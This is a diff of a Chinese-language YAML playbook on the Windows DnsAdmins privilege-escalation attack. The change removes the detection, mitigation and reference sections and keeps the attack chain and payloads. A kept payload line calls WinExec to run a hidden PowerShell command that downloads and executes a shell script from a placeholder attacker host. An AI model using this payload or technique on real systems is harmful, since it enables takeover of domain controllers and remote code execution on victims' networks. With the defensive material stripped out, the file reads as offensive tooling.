@@ -267,46 +267,6 @@ persistence:
       # 方法4: DNS服务配置持久化
 
 # 检测和防御
-defense:
-  - detection: |
-      # 检测DnsAdmins攻击
-
-      # 1. 监控DnsAdmins组成员变更
-      Get-WinEvent -FilterHashtable @{
-        LogName='Security'
-        ID=4728,4732,4756
-      } | Where-Object { $_.Message -match "DnsAdmins" }
-
-      # 2. 监控DNS服务重启
-
-      # 3. 监控ServerLevelPluginDll注册表修改
-      Get-WinEvent -FilterHashtable @{
-        LogName='Security'
-        ID=4657
-      } | Where-Object {
-        $_.Message -match "ServerLevelPluginDll"
-      }
-
-      # 4. 检查异常DLL配置
-      reg query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
-
-      # 5. 审计DNS记录变更
-
-  - mitigation: |
-      # 缓解措施
-
-      # 1. 严格限制DnsAdmins组成员
-
-      # 2. 监控ServerLevelPluginDll设置
-
-      # 3. 禁止从网络位置加载DLL
-
-      # 4. 启用DNS服务日志
-
-      # 5. 定期审计DNS配置
-
-      # 6. 使用AppLocker限制DLL加载
-
 # 完整攻击流程
 attack_chain:
   - step1: "检查DnsAdmins组成员身份"
@@ -354,8 +314,3 @@ payloads:
       WinExec("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')", SW_HIDE);
 
 # 参考资源
-references:
-  - https://adsecurity.org/?p=4044
-  - https://www.harmj0y.net/blog/ad/dns-admins-to-domain-admins/
-  - https://github.com/GhostPack/SharpDnsAdmin
-  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-in-one-hour-a-i-72e2bd1d6c5
